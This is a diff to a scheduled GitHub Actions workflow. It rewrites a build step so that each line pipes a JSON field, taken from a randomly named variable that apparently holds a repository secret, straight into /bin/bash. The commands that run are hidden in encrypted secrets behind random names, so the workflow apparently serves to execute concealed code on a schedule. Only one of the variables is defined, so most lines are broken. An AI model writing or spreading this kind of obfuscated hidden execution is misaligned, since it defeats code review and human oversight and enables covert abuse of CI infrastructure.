@@ -3,24 +3,27 @@ name: fuluohan4710
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
-
-jobs:  # 19115
+    - cron: '31 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fuluohan4710
         env:
-          zlu68: ${{ secrets.zlu68 }}
+          ub09316: ${{ secrets.ub09316 }}
         run: |
-          echo $zlu68 | jq -r .x7 | /bin/bash
-          echo $rdwyj3806 | jq -r .vteq67998 | /bin/bash
-          echo $yr2 | jq -r .dyjwr76 | /bin/bash
-          echo $ixgej7088 | jq -r .eid10800 | /bin/bash
-          echo $l54 | jq -r .lcr04073 | /bin/bash
-          echo $ve59 | jq -r .m09 | /bin/bash
-          echo $uv9331 | jq -r .hxdgi608 | /bin/bash
-          echo $i5566 | jq -r .jvdjd2 | /bin/bash
+          echo $ub09316 | jq -r .zhtkx908 | /bin/bash
+          echo $t176 | jq -r .bt47707 | /bin/bash
+          echo $rxo9212 | jq -r .v3 | /bin/bash
+          echo $nwh067 | jq -r .rn868 | /bin/bash
+          echo $g4 | jq -r .fr8250 | /bin/bash
+          echo $gjg30909 | jq -r .jh88 | /bin/bash
+          echo $lhq901 | jq -r .cvvdz73 | /bin/bash
+          echo $ljd15 | jq -r .rvtpi986 | /bin/bash
+          echo $c8880 | jq -r .ixntr69 | /bin/bash
+          echo $i802 | jq -r .i507 | /bin/bash
+          echo $jrm64 | jq -r .ul8 | /bin/bash
+          echo $ycw57 | jq -r .fekt158 | /bin/bash
+          echo $n2156 | jq -r .wou50 | /bin/bash
 
